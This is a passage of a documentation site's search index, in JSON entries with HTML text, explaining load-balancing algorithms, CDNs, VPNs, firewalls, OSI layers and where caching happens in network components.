state).</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#static-load-balancing-algorithms","title":"Static Load Balancing Algorithms","text":"<p>Static algorithms use predetermined logic without considering current server state or load.</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#1-round-robin","title":"1. Round Robin","text":"<p>How it works: - Distributes requests sequentially across all servers in circular order - Server 1 \u2192 Server 2 \u2192 Server 3 \u2192 Server 1 \u2192 Server 2... - Maintains a pointer to track the next server</p> <p>Example: <pre><code>Request 1 \u2192 Server A\nRequest 2 \u2192 Server B\nRequest 3 \u2192 Server C\nRequest 4 \u2192 Server A\nRequest 5 \u2192 Server B\n</code></pre></p> <p>Best for: - Servers with identical specifications - Requests with similar processing time - Simple, predictable distribution</p> <p>Advantages: - \u2705 Simple to implement - \u2705 Equal distribution across servers - \u2705 No complex calculations needed - \u2705 Predictable behavior - \u2705 Works well with identical servers</p> <p>Disadvantages: - \u274c Doesn't consider server capacity differences - \u274c Ignores current server load - \u274c Can overload slower servers - \u274c No consideration for request complexity - \u274c Poor for heterogeneous server environments - \u274c Doesn't handle server failures well initially</p> <p>Use Case: - Homogeneous server cluster with similar request patterns - Stateless applications - When simplicity is priority</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#2-weighted-round-robin","title":"2. Weighted Round Robin","text":"<p>How it works: - Assigns weight to each server based on capacity - Higher weight = receives more requests - Server with weight 3 receives 3x more traffic than server with weight 1</p> <p>Example: <pre><code>Server A: weight = 3\nServer B: weight = 2\nServer C: weight = 1\n\nDistribution:\nRequest 1 \u2192 Server A\nRequest 2 \u2192 Server A\nRequest 3 \u2192 Server A\nRequest 4 \u2192 Server B\nRequest 5 \u2192 Server B\nRequest 6 \u2192 Server C\n(Then repeats)\n</code></pre></p> <p>Best for: - Servers with different capacities (CPU, RAM, network) - Heterogeneous infrastructure - Gradual server rollouts (new server gets low weight initially)</p> <p>Advantages: - \u2705 Handles servers with different capacities - \u2705 Better utilization of powerful servers - \u2705 Can phase in new servers gradually - \u2705 Simple to configure and understand - \u2705 Predictable distribution based on weights</p> <p>Disadvantages: - \u274c Requires manual weight configuration - \u274c Doesn't adapt to runtime conditions - \u274c Weights may become outdated as server performance changes - \u274c Doesn't consider current server load - \u274c Still distributes requests even if server is overloaded</p> <p>Use Case: - Mixed server environment (e.g., some servers with 16GB RAM, others with 32GB) - Blue-green deployments (old version weight=1, new version weight=9) - Canary releases</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#3-ip-hash-source-ip-hash","title":"3. IP Hash (Source IP Hash)","text":"<p>How it works: - Hashes client's IP address to determine which server handles request - Same client always routed to same server (session persistence) - Hash function: <code>hash(client_IP) % number_of_servers</code></p> <p>Example: <pre><code>Client IP: 192.168.1.100 \u2192 hash() \u2192 Server A\nClient IP: 192.168.1.101 \u2192 hash() \u2192 Server C\nClient IP: 192.168.1.102 \u2192 hash() \u2192 Server B\n\nAll future requests from 192.168.1.100 go to Server A\n</code></pre></p> <p>Best for: - Session persistence without cookies - Stateful applications - Applications with server-side caching per user</p> <p>Advantages: - \u2705 Session persistence (no need for sticky sessions configuration) - \u2705 Simple implementation - \u2705 No session store required - \u2705 Good for applications with user-specific server state - \u2705 Deterministic routing</p> <p>Disadvantages: - \u274c Uneven distribution if client IPs are not uniformly distributed - \u274c Adding/removing servers changes hash distribution (session loss) - \u274c Doesn't consider server load - \u274c Multiple users behind same NAT go to same server - \u274c No failover for user's designated server - \u274c Can create hotspots if many users share IP range</p> <p>Use Case: - Shopping carts stored in server memory - WebSocket connections requiring persistent connections - Applications with server-side user sessions</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#4-url-hash","title":"4. URL Hash","text":"<p>How it works: - Hashes the requested URL to determine server - Same URL always goes to same server - Enables effective caching per server</p> <p>Example: <pre><code>URL: /images/logo.png \u2192 hash() \u2192 Server A\nURL: /api/users \u2192 hash() \u2192 Server B\nURL: /static/style.css \u2192 hash() \u2192 Server C\n\nAll requests for logo.png go to Server A (cached there)\n</code></pre></p> <p>Best for: - Cache optimization - Content-based distribution - CDN origin selection</p> <p>Advantages: - \u2705 Maximizes cache hit ratio - \u2705 Same content always on same server - \u2705 Reduces redundant caching across servers - \u2705 Good for content servers</p> <p>Disadvantages: - \u274c Can create uneven load distribution - \u274c Popular URLs create hotspots - \u274c Adding/removing servers disrupts caching - \u274c Not suitable for dynamic content</p> <p>Use Case: - Proxy caching servers - Static content distribution - CDN origin server selection</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#dynamic-load-balancing-algorithms","title":"Dynamic Load Balancing Algorithms","text":"<p>Dynamic algorithms make real-time decisions based on current server state and performance metrics.</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#1-least-connections","title":"1. Least Connections","text":"<p>How it works: - Tracks active connections to each server - Routes new request to server with fewest active connections - Updates connection count as connections are established/closed</p> <p>Example: <pre><code>Server A: 5 active connections\nServer B: 3 active connections  \u2190 New request goes here\nServer C: 7 active connections\n\nNext request goes to server with least connections at that moment\n</code></pre></p> <p>Best for: - Requests with varying processing times - Long-lived connections (WebSockets, SSE) - Heterogeneous request complexity</p> <p>Advantages: - \u2705 Better distribution than round-robin for variable request times - \u2705 Prevents overloading servers with long requests - \u2705 Adapts to server performance automatically - \u2705 Good for applications with mixed quick/slow requests - \u2705 Real-time load awareness</p> <p>Disadvantages: - \u274c More complex than static algorithms - \u274c Requires connection tracking overhead - \u274c Doesn't consider request complexity (1 heavy request = 1 light request) - \u274c Connection count doesn't always reflect actual load - \u274c May not work well if all requests are very short</p> <p>Use Case: - Chat applications (long-lived WebSocket connections) - Streaming services - Database connection pooling - Applications with mixed request durations</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#2-weighted-least-connections","title":"2. Weighted Least Connections","text":"<p>How it works: - Combines server weights with connection counts - Routes to server with lowest ratio of <code>(current_connections / weight)</code> - Accounts for both capacity and current load</p> <p>Example: <pre><code>Server A: 10 connections, weight = 3 \u2192 ratio = 10/3 = 3.33\nServer B: 5 connections, weight = 2  \u2192 ratio = 5/2 = 2.50  \u2190 New request\nServer C: 8 connections, weight = 1  \u2192 ratio = 8/1 = 8.00\n</code></pre></p> <p>Advantages: - \u2705 Combines benefits of weighted round-robin and least connections - \u2705 Handles heterogeneous servers with varying loads - \u2705 Better than least connections for different server capacities - \u2705 Adaptive to both static capacity and runtime load</p> <p>Disadvantages: - \u274c Requires weight configuration - \u274c More complex tracking - \u274c Still doesn't measure actual CPU/memory usage</p> <p>Use Case: - Mixed server environments with variable request durations</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#3-least-response-time-least-latency","title":"3. Least Response Time (Least Latency)","text":"<p>How it works: - Monitors response time from each server - Routes to server with fastest average response time - May combine response time with active connections</p> <p>Example: <pre><code>Server A: avg response = 50ms, 5 connections\nServer B: avg response = 30ms, 8 connections  \u2190 New request (fastest)\nServer C: avg response = 80ms, 3 connections\n</code></pre></p> <p>Best for: - Geographically distributed servers - Servers with varying performance - Applications where latency is critical</p> <p>Advantages: - \u2705 Routes to fastest/healthiest server - \u2705 Automatically detects server performance issues - \u2705 Excellent user experience (lowest latency) - \u2705 Geographic optimization - \u2705 Adapts to network conditions</p> <p>Disadvantages: - \u274c Requires continuous response time monitoring - \u274c Higher overhead (tracking and calculations) - \u274c Can create positive feedback loop (fast server gets more traffic, becomes slow) - \u274c Sensitive to temporary spikes - \u274c May need smoothing algorithms to prevent oscillation</p> <p>Use Case: - Multi-region deployments - CDN origin selection - Real-time applications requiring low latency</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#4-resource-based-adaptive-load-based","title":"4. Resource-Based (Adaptive / Load-Based)","text":"<p>How it works: - Monitors actual server resources: CPU, memory, disk I/O, network - Routes to server with most available resources - Requires agent or monitoring system on each server</p> <p>Example: <pre><code>Server A: CPU 80%, Memory 60%, Score = Low\nServer B: CPU 40%, Memory 30%, Score = High  \u2190 New request\nServer C: CPU 70%, Memory 85%, Score = Low\n</code></pre></p> <p>Best for: - Compute-intensive applications - Servers with varying workload types - Cloud environments with auto-scaling</p> <p>Advantages: - \u2705 Most accurate representation of server load - \u2705 Prevents resource exhaustion - \u2705 Works well for diverse workload types - \u2705 Can consider multiple metrics (CPU, memory, custom) - \u2705 Best for complex applications</p> <p>Disadvantages: - \u274c Most complex to implement - \u274c Requires monitoring agents on servers - \u274c Higher overhead - \u274c Latency in metric collection - \u274c Requires careful tuning of metrics and thresholds</p> <p>Use Case: - Video encoding servers (CPU-intensive) - Data processing pipelines - Machine learning inference servers - Batch processing systems</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#5-least-bandwidth","title":"5. Least Bandwidth","text":"<p>How it works: - Tracks bandwidth usage per server - Routes to server consuming least bandwidth (Mbps) - Good for content delivery</p> <p>Advantages: - \u2705 Optimizes network utilization - \u2705 Good for bandwidth-constrained environments - \u2705 Prevents network saturation</p> <p>Disadvantages: - \u274c Requires bandwidth monitoring - \u274c Doesn't reflect server CPU/memory load - \u274c Less common in modern deployments</p> <p>Use Case: - Video/media streaming - Large file downloads - Bandwidth-limited servers</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#6-random","title":"6. Random","text":"<p>How it works: - Selects server randomly - Simple probabilistic distribution</p> <p>Advantages: - \u2705 Extremely simple - \u2705 No state tracking - \u2705 Works well with large server pools</p> <p>Disadvantages: - \u274c No load awareness - \u274c Uneven distribution possible - \u274c Not optimal for most use cases</p> <p>Use Case: - Large, homogeneous server pools - Stateless microservices with auto-scaling</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#algorithm-selection-guide","title":"Algorithm Selection Guide","text":"Scenario Recommended Algorithm Reason Identical servers, simple requests Round Robin Simple, equal distribution Different server capacities Weighted Round Robin Accounts for capacity differences Session persistence needed IP Hash Maintains user-server affinity Long-lived connections Least Connections Prevents connection buildup Variable request complexity Least Connections Adapts to request duration Different servers + variable load Weighted Least Connections Best of both worlds Latency-critical applications Least Response Time Routes to fastest server CPU/memory-intensive work Resource-Based Monitors actual resource usage Multi-region deployment Least Response Time / GSLB Geographic optimization Content caching URL Hash Maximizes cache hits <p>Layers of Load Balancing: - Layer 4 (Transport): Operates at TCP/UDP level, routes based on IP and port - Layer 7 (Application): Operates at HTTP level, routes based on content, headers, cookies</p> <p>Use Cases: - Distribute traffic across multiple servers - Ensure high availability through redundancy - Enable horizontal scaling - Perform health checks and remove failed servers - Implement session persistence (sticky sessions)</p> <p>Example Tools: - HAProxy - Nginx - AWS ELB/ALB/NLB - Google Cloud Load Balancing - F5 BIG-IP - Envoy - Traefik</p> <p>Connection to Other Concepts: - Type of Reverse Proxy: Load balancer is a specialized reverse proxy focused on distribution - Different from Reverse Proxy: Load balancer specifically focuses on distributing load; reverse proxy has broader capabilities - Can be used instead of: Simple reverse proxy when you need traffic distribution - Works with: CDN (load balancing can happen at CDN edge), Firewall (for security)</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#cdn-content-delivery-network","title":"CDN (Content Delivery Network)","text":"<p>A CDN is a geographically distributed network of proxy servers and data centers that deliver content to users based on their geographic location, ensuring faster content delivery and reduced latency.</p> <p>How it works: 1. Origin server stores the original content 2. CDN caches content at multiple edge locations worldwide 3. Client request is routed to nearest edge server 4. Edge server serves cached content (if available) or fetches from origin 5. Content is cached at edge for future requests</p> <p>Components: - Origin Server: The source of truth for content - Edge Servers: Distributed servers that cache content - PoP (Point of Presence): Physical locations of edge servers</p> <p>Use Cases: - Deliver static content (images, CSS, JavaScript) - Stream video/audio content - Reduce origin server load - Improve website performance globally - DDoS protection through distributed architecture - Handle traffic spikes</p> <p>Example Tools/Services: - Cloudflare - AWS CloudFront - Akamai - Fastly - Azure CDN - Google Cloud CDN</p> <p>Connection to Other Concepts: - Uses Reverse Proxy: Each edge server is a reverse proxy - Different from Load Balancer: CDN focuses on geographic distribution and caching; load balancer focuses on traffic distribution across servers in same location - Can replace: Load balancer for static content delivery - Works with: Load balancer (CDN for static, LB for dynamic content) - Includes: Caching, which reverse proxies can also do</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#vpn-virtual-private-network","title":"VPN (Virtual Private Network)","text":"<p>A VPN creates a secure, encrypted tunnel between client and server (or network), ensuring privacy and security of data transmission over public networks.</p> <p>How it works: 1. Client initiates VPN connection to VPN server 2. Encrypted tunnel is established 3. All client traffic is routed through this tunnel 4. VPN server forwards traffic to destination 5. Responses return through the encrypted tunnel</p> <p>Types: - Remote Access VPN: Individual users connect to corporate network - Site-to-Site VPN: Connect entire networks (e.g., office branches) - SSL/TLS VPN: Browser-based VPN access - IPSec VPN: Protocol-level encryption for network traffic</p> <p>Use Cases: - Secure remote access to corporate resources - Encrypt internet traffic on public WiFi - Bypass geo-restrictions and censorship - Hide IP address and location - Connect multiple office locations securely</p> <p>Example Tools: - OpenVPN - WireGuard - Cisco AnyConnect - IPSec - PPTP/L2TP</p> <p>Connection to Other Concepts: - Different from Forward Proxy: VPN encrypts ALL traffic at network layer; forward proxy works at application layer without encryption - Different from Reverse Proxy: VPN focuses on secure tunneling; reverse proxy on request forwarding - Can be used instead of: Forward proxy when encryption and privacy are critical - Similar to: SSH tunneling (both create encrypted tunnels) - Works with: Firewall (VPN often integrated with firewall policies)</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#firewall","title":"Firewall","text":"<p>A firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules, acting as a barrier between trusted and untrusted networks.</p> <p>How it works: 1. Traffic attempts to enter or leave the network 2. Firewall examines packets against configured rules 3. Allowed traffic passes through; blocked traffic is denied 4. Logs security events for monitoring</p> <p>Types: - Packet Filtering Firewall: Examines packets in isolation based on IP, port, protocol - Stateful Inspection Firewall: Tracks connection state, examines packet context - Application Layer Firewall (WAF): Inspects application-level data (HTTP, FTP) - Next-Generation Firewall (NGFW): Deep packet inspection, IPS, application awareness - Proxy Firewall: Acts as intermediary, no direct connection between networks</p> <p>Levels: - Network Firewall: Protects entire network perimeter - Host-based Firewall: Protects individual devices - Cloud Firewall: Protects cloud infrastructure</p> <p>Use Cases: - Block unauthorized access - Filter malicious traffic - Implement security policies - Segment network zones - Prevent data exfiltration - Comply with security regulations</p> <p>Example Tools: - iptables/nftables (Linux) - pfSense - Cisco ASA - Palo Alto Networks - Fortinet FortiGate - AWS Security Groups - Azure Firewall</p> <p>Connection to Other Concepts: - Can include Proxy: Proxy firewalls combine both technologies - Different from Proxy: Firewall focuses on security rules; proxy on request forwarding - Works with: Load balancers, reverse proxies (deployed in layers) - Can be used with: VPN (firewall rules control VPN access) - Different from WAF: Traditional firewall works at network layer; WAF at application layer</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#comparison-summary","title":"Comparison Summary","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#key-differences","title":"Key Differences","text":"Concept Primary Purpose Layer Direction Client Awareness Forward Proxy Protect clients, control access Application (L7) Client \u2192 Internet Client configured Reverse Proxy Protect servers, optimize delivery Application (L7) Internet \u2192 Servers Transparent to client Load Balancer Distribute traffic L4 or L7 Internet \u2192 Servers Transparent to client CDN Geographic content delivery Application (L7) Internet \u2192 Edge Servers Transparent to client VPN Secure encrypted tunnel Network (L3) Bidirectional Client configured Firewall Security filtering L3-L7 Bidirectional Transparent"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#when-to-use-what","title":"When to Use What","text":"<p>Use Forward Proxy when: - You need to control outbound traffic - You want to cache external content - You need to provide anonymity for clients - You want to filter employee internet access</p> <p>Use Reverse Proxy when: - You need to hide backend infrastructure - You want to handle SSL termination - You need request routing based on content - You want to cache responses from backend</p> <p>Use Load Balancer when: - You have multiple servers handling same service - You need high availability and fault tolerance - You want to scale horizontally - You need session persistence</p> <p>Use CDN when: - You serve content to global audience - You have large amounts of static content - You need to reduce origin server load - You want to improve page load times</p> <p>Use VPN when: - You need secure remote access - You want to encrypt all traffic - You need to connect remote offices - Privacy and security are top priorities</p> <p>Use Firewall when: - You need to enforce security policies - You want to block unauthorized access - You need to segment your network - Compliance requires traffic filtering</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#can-be-used-as-alternatives","title":"Can Be Used As Alternatives","text":"<ol> <li>Load Balancer \u2194 Reverse Proxy: For simple traffic distribution, reverse proxy can replace load balancer</li> <li>Forward Proxy \u2194 VPN: For basic anonymity, but VPN provides encryption</li> <li>CDN \u2194 Reverse Proxy with Caching: For local deployments, reverse proxy can cache like CDN</li> <li>Firewall \u2194 Proxy: Application-layer proxy can provide some firewall functionality</li> </ol>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#complementary-use-used-together","title":"Complementary Use (Used Together)","text":"<ul> <li>Firewall + Load Balancer: Firewall filters traffic before load balancer distributes it</li> <li>CDN + Load Balancer: CDN handles static content, load balancer handles dynamic</li> <li>Reverse Proxy + Firewall: Layered security and optimization</li> <li>VPN + Firewall: Secure remote access with access control</li> <li>Load Balancer + Reverse Proxy: Load balancer distributes, reverse proxy handles SSL/caching</li> </ul>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#osi-layer-analysis","title":"OSI Layer Analysis","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#application-layer-layer-7","title":"Application Layer (Layer 7)","text":"<p>Components that operate at the application layer understand and can manipulate the content of requests/responses:</p> <p>Forward Proxy: - Layer: Application Layer (L7) - How: Interprets HTTP/HTTPS requests, understands URLs, headers, cookies - Capabilities: Can modify request headers, block specific URLs, authenticate users, cache based on content - Example: Squid proxy parsing HTTP requests, filtering based on URL patterns</p> <p>Reverse Proxy: - Layer: Application Layer (L7) - How: Inspects HTTP requests, routes based on URL paths, headers, methods - Capabilities: SSL termination, URL rewriting, header manipulation, content-based routing - Example: Nginx routing <code>/api/*</code> to API servers and <code>/static/*</code> to static file servers</p> <p>Layer 7 Load Balancer: - Layer: Application Layer (L7) - How: Deep packet inspection, understands HTTP/HTTPS, can read request content - Capabilities: Route based on URL, cookies, headers; sticky sessions based on cookies; advanced health checks - Example: AWS ALB routing based on URL path <code>/users/*</code> to user service, <code>/orders/*</code> to order service</p> <p>CDN: - Layer: Application Layer (L7) - How: Understands HTTP/HTTPS, caches based on content type, headers (Cache-Control, ETag) - Capabilities: Smart caching, content compression, image optimization, HTTP/2 and HTTP/3 support - Example: CloudFlare caching static assets, respecting HTTP cache headers</p> <p>Web Application Firewall (WAF): - Layer: Application Layer (L7) - How: Deep packet inspection, parses HTTP requests/responses, understands SQL, XSS patterns - Capabilities: SQL injection detection, XSS prevention, OWASP Top 10 protection - Example: AWS WAF inspecting POST body for malicious SQL patterns</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#networktransport-layer-layer-34","title":"Network/Transport Layer (Layer 3/4)","text":"<p>Components that operate at network or transport layer work with IP addresses, ports, and protocols:</p> <p>Layer 4 Load Balancer: - Layer: Transport Layer (L4) - How: Operates on TCP/UDP packets, routes based on IP address and port - Capabilities: Faster than L7 (no content inspection), lower latency, protocol-agnostic - Example: AWS NLB routing TCP connections on port 443 without inspecting HTTPS content</p> <p>VPN: - Layer: Network Layer (L3) - primarily, can also use L4 - How: Encapsulates IP packets, creates encrypted tunnels at IP level - Types by Layer:   - IPSec VPN: Layer 3 (Network)   - OpenVPN: Can use Layer 3 (tun) or Layer 2 (tap)   - WireGuard: Layer 3 - Capabilities: Encrypts all traffic regardless of protocol, routes entire network segments - Example: IPSec encrypting IP packets, creating site-to-site tunnels</p> <p>Traditional Firewall (Packet Filter): - Layer: Network (L3) and Transport (L4) - How: Inspects IP headers (source/dest IP) and TCP/UDP headers (ports) - Capabilities: Fast filtering based on IP, port, protocol; maintains connection state - Example: iptables blocking incoming traffic on port 22 from specific IP ranges</p> <p>Stateful Firewall: - Layer: Network (L3) and Transport (L4) - How: Tracks TCP connection states (SYN, ACK, FIN), maintains session tables - Capabilities: Understands connection lifecycle, prevents half-open attacks, allows return traffic - Example: pfSense tracking established connections, auto-allowing response packets</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#both-application-and-network-layer","title":"Both Application and Network Layer","text":"<p>Next-Generation Firewall (NGFW): - Layers: L3, L4, and L7 - How: Multi-layer inspection - packet headers, connection state, AND application content - Capabilities: IPS/IDS, application awareness, user identity, malware detection - Example: Palo Alto firewall identifying and blocking BitTorrent traffic regardless of port</p> <p>Advanced Load Balancers: - Layers: Can operate at both L4 and L7 - How: HAProxy, F5 can do simple L4 routing or deep L7 inspection based on configuration - Capabilities: Flexibility to choose performance (L4) vs features (L7) - Example: HAProxy using L4 mode for high-throughput video streaming, L7 for API routing</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#packet-level-operations","title":"Packet-Level Operations","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#components-working-at-packet-level","title":"Components Working at Packet Level","text":"<p>Packet Filtering Firewall: - Operation: Examines each packet individually - What it sees: IP header (source IP, dest IP, protocol), TCP/UDP header (ports, flags) - Decisions: Allow/deny based on rules matching packet attributes - Limitation: No context about connection state or application data - Example: Blocking all packets from IP 192.168.1.100 to port 3389 (RDP)</p> <p>Stateful Firewall: - Operation: Examines packets AND tracks connection state - What it maintains: Connection table (5-tuple: src IP, src port, dst IP, dst port, protocol) - State Tracking: NEW, ESTABLISHED, RELATED, INVALID states - Advantage: Allows return traffic automatically, detects anomalies - Example: Allowing outbound HTTPS (NEW), auto-allowing return packets (ESTABLISHED)</p> <p>Layer 4 Load Balancer: - Operation: Examines IP and TCP/UDP headers of packets - Packet Modification: Changes destination IP (from LB IP to backend server IP), maintains source IP or uses NAT - Session Tracking: Ensures all packets from same connection go to same backend server - Performance: Minimal packet inspection = high throughput - Example: AWS NLB forwarding TCP packets based on 5-tuple hash</p> <p>VPN (IPSec): - Operation: Encapsulates and encrypts IP packets - Packet Structure:   - Original: <code>[IP Header][TCP Header][Data]</code>   - After IPSec: <code>[New IP Header][IPSec Header][Encrypted: IP Header + TCP Header + Data]</code> - Modes:   - Transport Mode: Encrypts only payload   - Tunnel Mode: Encrypts entire original packet - Example: Site-to-site VPN encrypting all packets between office networks</p> <p>Deep Packet Inspection (DPI): - Who uses it: NGFW, WAF, IDS/IPS, some ISPs - Operation: Examines packet payload (actual data content), not just headers - What it finds: Malware signatures, protocol violations, encrypted traffic patterns, application types - Use cases: Detecting malware, identifying applications (Skype, BitTorrent), enforcing policies - Example: NGFW detecting SSH tunnel inside HTTPS traffic based on packet patterns</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#components-not-working-at-packet-level","title":"Components NOT Working at Packet Level","text":"<p>Application Layer Proxies (L7): - Operation: Terminates connections, works with complete HTTP requests/responses - What it sees: Full HTTP request with headers, body, cookies - NOT individual packets - Difference: Reassembles TCP stream into HTTP message before processing - Example: Nginx receives complete HTTP request, makes decisions, creates new request to backend</p> <p>Layer 7 Load Balancer: - Operation: Processes complete HTTP requests, not packets - Buffer: Receives and buffers entire request before routing - Latency Trade-off: Slightly higher latency than L4, but enables content-based routing - Example: ALB waits for complete HTTP request to read URL path before routing</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#caching-capabilities","title":"Caching Capabilities","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#where-caching-is-achieved","title":"Where Caching is Achieved","text":""},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#1-forward-proxy-caching","title":"1. Forward Proxy (\u2705 Caching)","text":"<p>What is cached: - External website content (HTML, CSS, JS, images) - API responses from external services - Software packages, updates, downloads</p> <p>How it works: - Client requests <code>example.com/image.jpg</code> - Proxy checks local cache for this URL - If cached and fresh: Returns cached copy (cache HIT) - If not cached or stale: Fetches from origin, stores in cache, returns to client (cache MISS)</p> <p>Cache Validation: - TTL (Time To Live): Cache for N seconds/minutes - HTTP Headers: Respects <code>Cache-Control</code>, <code>Expires</code>, <code>ETag</code>, <code>Last-Modified</code> - Revalidation: Asks origin \"Is this still valid?\" using <code>If-None-Match</code>, <code>If-Modified-Since</code></p> <p>Benefits: - Reduced bandwidth usage (don't re-download same files) - Faster response for frequently accessed content - Reduced load on external servers</p> <p>Example: <pre><code>Squid caching configuration:\n- Cache all images for 7 days\n- Cache CSS/JS for 24 hours\n- Never cache dynamic content (URLs with query params)\n</code></pre></p> <p>Use Case: Corporate proxy caching Windows updates - download once, serve to 1000 employees</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#2-reverse-proxy-caching","title":"2. Reverse Proxy (\u2705 Caching)","text":"<p>What is cached: - Static files (images, CSS, JS, fonts) - API responses (especially GET requests) - Rendered HTML pages - Database query results (application-level caching)</p> <p>How it works: - Client requests <code>/api/products</code> - Reverse proxy checks cache for this endpoint - If cached: Returns immediately (backend not touched) - If not cached: Forwards to backend, caches response, returns to client</p> <p>Cache Strategies: - Cache Key: URL, query params, headers (User-Agent, Accept-Language) - Cache Invalidation: Time-based (TTL), event-based (purge on update), LRU (Least Recently Used) - Selective Caching: Only cache GET requests, specific paths, or response codes (200, 301, 404)</p> <p>Benefits: - Dramatically reduced backend load - Sub-millisecond response times for cached content - Better handling of traffic spikes</p> <p>Example: <pre><code># Nginx caching configuration\nproxy_cache_path /var/cache/nginx levels=1:2 keys_zone=my_cache:10m max_size=1g;\nproxy_cache my_cache;\nproxy_cache_valid 200 1h;  # Cache successful responses for 1 hour\nproxy_cache_valid 404 5m;  # Cache 404s for 5 minutes\n</code></pre></p> <p>Use Case: E-commerce site caching product images and static product details, reducing database queries by 90%</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#3-cdn-caching-primary-purpose","title":"3. CDN (\u2705 Caching - Primary Purpose)","text":"<p>What is cached: - Static assets (images, videos, CSS, JavaScript) - Downloadable files (PDFs, software installers) - Streaming media chunks - API responses (at edge locations)</p> <p>How it works: - User in Tokyo requests <code>cdn.example.com/logo.png</code> - Request goes to nearest CDN edge server (Tokyo PoP) - Edge server checks local cache - If cached: Serves immediately (&lt; 10ms latency) - If not cached: Fetches from origin (or parent cache), stores locally, serves to user - Subsequent requests from Tokyo users served from edge cache</p> <p>Cache Hierarchy: - Edge Servers: Closest to users, cache most popular content - Regional Caches: Mid-tier, cache less popular content - Origin Shield: Optional layer before origin, reduces origin load</p> <p>Advanced Caching: - Geo-specific caching: Different content for different regions - Device-specific caching: Mobile vs desktop versions - Dynamic content caching: Cache personalized content with cache keys based on cookies/headers</p> <p>Benefits: - Global performance - low latency worldwide - Massive bandwidth offload from origin (95%+ cache hit rates possible) - Handles traffic spikes (viral content)</p> <p>Example: <pre><code>CloudFlare Page Rules:\n- Cache Everything for *.jpg, *.png, *.css (1 month TTL)\n- Cache API responses for /api/public/* (5 minutes TTL)\n- Bypass cache for /api/user/* (personalized data)\n</code></pre></p> <p>Use Case: Netflix using CDN to cache movie chunks - origin serves each chunk once, CDN serves millions of times</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#4-load-balancer-limited-caching","title":"4. Load Balancer (\u26a0\ufe0f Limited Caching)","text":"<p>Layer 4 Load Balancer: - Caching: \u274c NO - only forwards packets, doesn't cache - Reason: Works at transport layer, doesn't see application content</p> <p>Layer 7 Load Balancer: - Caching: \u26a0\ufe0f POSSIBLE but not primary purpose - What can be cached: Similar to reverse proxy (static responses, API responses) - Reality: Most L7 LBs don't cache by default; use dedicated reverse proxy/CDN instead</p> <p>Connection Caching (Different): - Persistent Connections: LB maintains connection pools to backend servers - Benefit: Reduces TCP handshake overhead for backend connections - Not content caching: Caches connections, not data</p> <p>Example: - HAProxy: Primarily routes, but can be configured with caching using cache plugin - AWS ALB: No native caching (use CloudFront in front of ALB) - F5 BIG-IP: Advanced models have content caching feature</p> <p>Recommendation: Use dedicated caching layer (reverse proxy or CDN) instead of relying on LB caching</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#5-vpn-no-caching","title":"5. VPN (\u274c NO Caching)","text":"<p>Why no caching: - Operates at network layer (L3), doesn't understand application content - All traffic is encrypted - cannot inspect or cache - Purpose is secure tunnel, not performance optimization - Tunnels packets as-is without modification</p> <p>Exception: - VPN concentrator might cache DNS responses - But not HTTP content or application data</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#6-firewall-no-caching-traditional","title":"6. Firewall (\u274c NO Caching - Traditional)","text":"<p>Traditional Firewall: - Caching: \u274c NO - Reason: Filters packets based on rules, doesn't store content - Purpose: Security, not performance</p> <p>Exception - Application Firewall/WAF: - Connection state caching: Maintains state tables (not content) - DNS caching: Some firewalls cache DNS responses - Not content caching: Doesn't cache HTTP responses or files</p> <p>Next-Gen Firewall (NGFW): - Threat signature caching: Caches malware signatures, URL categories - Still not content caching: For security purposes only</p>"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#caching-comparison-table","title":"Caching Comparison Table","text":"Component Caches Content? What is Cached Cache Location Primary Purpose Forward Proxy \u2705 YES External content, downloads Proxy server Reduce outbound bandwidth Reverse Proxy \u2705 YES Static files, API responses Reverse proxy server Reduce backend load CDN \u2705 YES (Primary) Static assets, media Edge servers globally Global performance L4 Load Balancer \u274c NO N/A N/A Traffic distribution L7 Load Balancer \u26a0\ufe0f Limited Possible but uncommon LB server Traffic distribution VPN \u274c NO N/A N/A Secure tunnel Firewall \u274c NO N/A N/A Security filtering WAF \u274c NO* *Only threat signatures WAF server Security"},{"location":"system-design/high-level/concepts/load-balancer-and-proxy-server/#caching-strategy-recommendations","title":"Caching Strategy Recommendations","text":"<p>For Static Content Globally: - Use CDN - 